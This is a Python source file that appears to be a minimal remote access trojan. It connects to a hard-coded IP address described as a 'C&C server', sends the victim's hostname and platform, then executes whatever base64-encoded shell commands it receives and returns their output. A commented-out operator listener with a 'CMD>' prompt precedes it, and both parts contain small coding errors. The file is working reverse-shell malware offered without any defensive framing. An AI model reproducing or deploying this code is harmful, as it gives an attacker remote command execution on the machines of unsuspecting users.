# import socket
# import base64
#
# sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# sock.bind(('localhost', 12391))
# sock.listen(5)
# conn, addr = sock.accept()
# print(f'New connection from {addr[0]} {addr[1]}')
# while True:
#     try:
#         data = sock.recv(1024)
#         print(base64.b64decode(data))
#         sock.send(input('CMD> ').encode('utf-8'))
#     except KeyboardInterrupt:
#         sock.close()
#
import socket
import base64
import platform
import subprocess
import os

MAX_CONNECTIONS = 5
address_to_server = ('176.115.90.172', 12396)

sock = socket.socket()

print(f'Connecting to the C&C server...')
sock.connect(address_to_server)

sock.send(base64.b64encode('online:{}:{}'.format(socket.gethostname(), platform.platform()).encode('utf-8')))


while True:
    data = sock.recv(1024)
    print(f'server command: {base64.b64decode(data).decode("utf-8")}')
    output = subprocess.check_output(base64.b64decode(data).decode("utf-8"), shell=True)
    sock.send(base64.b64encode(output.encode('utf-8')))
